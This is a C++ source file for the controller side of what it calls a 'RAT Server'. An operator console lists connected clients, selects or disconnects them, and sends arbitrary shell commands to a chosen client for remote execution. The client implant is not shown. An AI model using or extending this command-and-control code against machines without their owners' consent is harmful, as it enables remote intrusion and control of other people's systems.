#include "ServerCommandController.hpp"
#include "ServerManager.hpp"
#include "ServerLogController.hpp"
#include <iostream>
#include <sstream>
#include "Utils/TCPSocket.hpp"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstdlib>
#include <nlohmann/json.hpp>

namespace Server {

ServerCommandController::ServerCommandController(ServerManager *manager) : ServerController(nullptr), manager_(manager) {}
ServerCommandController::~ServerCommandController() { stop(); }

void ServerCommandController::start() {
    if (running_) return;
    running_ = true;

    // Only use existing client connections managed by ServerManager; rely on stdin for admin input
    if (isatty(STDIN_FILENO)) {
        stdinThread_ = std::make_unique<std::thread>(&ServerCommandController::stdinLoop, this);
    }
}

// spawn a terminal emulator (or tmux) to run innerCmd; returns pid (>0) for forked child,
// 0 when launched in tmux, -1 on failure
pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
    auto which_ok = [](const char *name)->bool {
        std::string cmd = std::string("which ") + name + " >/dev/null 2>&1";
        return std::system(cmd.c_str()) == 0;
    };

    std::string prog;
    if (which_ok("gnome-terminal")) prog = "gnome-terminal";
    else if (which_ok("konsole")) prog = "konsole";
    else if (which_ok("xterm")) prog = "xterm";
    else if (which_ok("tmux")) prog = "tmux";
    else return -1;

    if (prog == "tmux") {
        std::string s = std::string("tmux new-session -d -s rat_server '") + innerCmd + "'";
        int rc = std::system(s.c_str());
        return rc == 0 ? 0 : -1;
    }

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (prog == "gnome-terminal") {
            execlp("gnome-terminal", "gnome-terminal", "--", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "konsole") {
            execlp("konsole", "konsole", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "xterm") {
            execlp("xterm", "xterm", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        }
        _exit(127);
    }

    return pid;
}

std::string ServerCommandController::processLine(const std::string &line) {
    std::istringstream iss(line);
    std::string cmd; iss >> cmd;
    std::string reply;
    if (cmd == "help") {
        return handleHelp();
    } else if (cmd == "list") {
        return handleList();
    } else if (cmd == "choose") {
        std::string name; iss >> name;
        return handleChoose(name);
    } else if (cmd == "kill") {
        std::string name; iss >> name;
        return handleKill(name);
    } else if (cmd == "bash") {
        std::string name; iss >> name;
        std::string rest;
        std::getline(iss, rest);
        if (!rest.empty() && rest.front() == ' ') rest.erase(0,1);
        return handleBash(name, rest);
    } else if (cmd == "quit") {
        return handleQuit();
    } else if (cmd == "showlogs") {
        return handleShowLogs();
    }
    return std::string("Unknown command\n");
}

std::string ServerCommandController::handleList() {
    if (!manager_) return "Manager not available\n";
    std::string reply;
    auto clients = manager_->listClients();
    if (clients.empty()) return "No clients connected\n";
    reply = "Connected clients:\n";
    for (auto &c : clients) reply += "  - " + c + "\n";
    return reply;
}

std::string ServerCommandController::handleHelp() {
    std::string help;
    help += "\nAvailable Commands:\n";
    help += "==================\n";
    help += "  help                     - Show this help message\n";
    help += "  list                     - List all connected clients\n";
    help += "  choose <client>          - Select a client for subsequent commands\n";
    help += "  kill [client]            - Disconnect client (uses selected if not specified)\n";
    help += "  bash [client] <command>  - Execute shell command (uses selected if not specified)\n";
    help += "  showlogs                 - Open log viewer in new terminal\n";
    help += "  quit                     - Stop server and exit\n";
    help += "\nWorkflow:\n";
    help += "  1. list                  - See connected clients\n";
    help += "  2. choose client1        - Select client1\n";
    help += "  3. bash ls -la           - Run command on selected client\n";
    help += "  4. bash pwd              - Another command on same client\n";
    help += "\nExamples:\n";
    help += "  bash client1 ls -la      - List files on client1 (explicit)\n";
    help += "  choose client1           - Select client1\n";
    help += "  bash pwd                 - Show directory on selected client\n";
    help += "  kill                     - Disconnect selected client\n";
    help += "\n";
    return help;
}

std::string ServerCommandController::handleChoose(const std::string &name) {
    if (!manager_) return "Manager not available\n";
    if (name.empty()) return "Invalid client name\n";
    if (name.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Invalid characters in client name\n";
    }
    if (manager_->hasClient(name)) {
        selectedClient_ = name;
        return std::string("Selected client: ") + name + "\n";
    }
    return std::string("No such client\n");
}

std::string ServerCommandController::handleKill(const std::string &name) {
    if (!manager_) return "Manager not available\n";
    
    std::string targetClient = name.empty() ? selectedClient_ : name;
    
    if (targetClient.empty()) return "No client specified and no client selected\n";
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Invalid characters in client name\n";
    }
    
    if (manager_->removeClient(targetClient)) {
        if (targetClient == selectedClient_) selectedClient_.clear();
        return std::string("Killed ") + targetClient + "\n";
    }
    return std::string("No such client\n");
}

std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
    if (!manager_) return "Manager not available\n";
    
    std::string targetClient;
    std::string command;
    
    if (name.empty()) {
        if (selectedClient_.empty()) return "No client specified and no client selected\n";
        targetClient = selectedClient_;
        command = cmd;
    } else if (manager_->hasClient(name)) {
        targetClient = name;
        command = cmd;
    } else {
        if (selectedClient_.empty()) return "No such client and no client selected\n";
        targetClient = selectedClient_;
        command = name + (cmd.empty() ? "" : " " + cmd);
    }
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Invalid characters in client name\n";
    }
    
    IController *ctrl = manager_->getController(targetClient);
    if (!ctrl) return std::string("No such client\n");
    
    if (command.empty()) return "Empty command\n";
    
    nlohmann::json out{ {"controller", "bash"}, {"cmd", command} };
    if (!ctrl->sendJson(out)) {
        return "Failed to send command\n";
    }
    
    int maxWait = 50;
    int waited = 0;
    std::string lg;
    bool foundResponse = false;
    std::string output;
    
    while (waited < maxWait && !foundResponse) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        while (manager_->popLog(lg)) {
            try {
                nlohmann::json j = nlohmann::json::parse(lg);
                if (j.contains("out") && j["out"].is_string()) {
                    output = j["out"].get<std::string>();
                    int ret = j.contains("ret") ? j["ret"].get<int>() : -1;
                    foundResponse = true;
                    return "Output:\n" + output + "Exit code: " + std::to_string(ret) + "\n";
                }
            } catch (...) {}
        }
        waited++;
    }
    
    return "(No response - command may still be running)\n";
}

std::string ServerCommandController::handleQuit() {
    running_ = false;
    if (manager_) manager_->stop();
    return std::string("Quitting\n");
}

std::string ServerCommandController::handleShowLogs() {
    ServerController *lc = nullptr;
    if (manager_) lc = manager_->getServerController("log");
    if (!lc) return std::string("No log controller\n");
    auto *slc = dynamic_cast<ServerLogController *>(lc);
    if (!slc) return std::string("Invalid log controller\n");
    std::string path = manager_->logPath();
    if (path.empty()) path = "/tmp/rat_server.log";
    std::string inner = std::string("../build_make/log_script ") + path + std::string("; exec bash");
    pid_t p = spawnTerminal(inner);
    if (p == -1) return std::string("No terminal emulator available\n");
    if (p == 0) return std::string("Launched in tmux session\n");
    return std::string("Launched terminal pid=") + std::to_string(p) + "\n";
}

// adminLoop removed: we use existing client connections via ServerManager and stdin for commands

void ServerCommandController::stdinLoop() {
    std::string line;
    std::cout << "\n=== RAT Server Control ===" << std::endl;
    std::cout << "Type 'help' for available commands\n" << std::endl;
    
    while (running_) {
        if (!selectedClient_.empty()) {
            std::cout << "[" << selectedClient_ << "] > " << std::flush;
        } else {
            std::cout << "\n> " << std::flush;
        }
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;
        
        std::string reply = processLine(line);
        if (!reply.empty()) {
            std::cout << reply << std::flush;
        }
    }
}

void ServerCommandController::stop() {
    if (!running_) return;
    running_ = false;
    if (stdinThread_ && stdinThread_->joinable()) stdinThread_->join();
}

} 

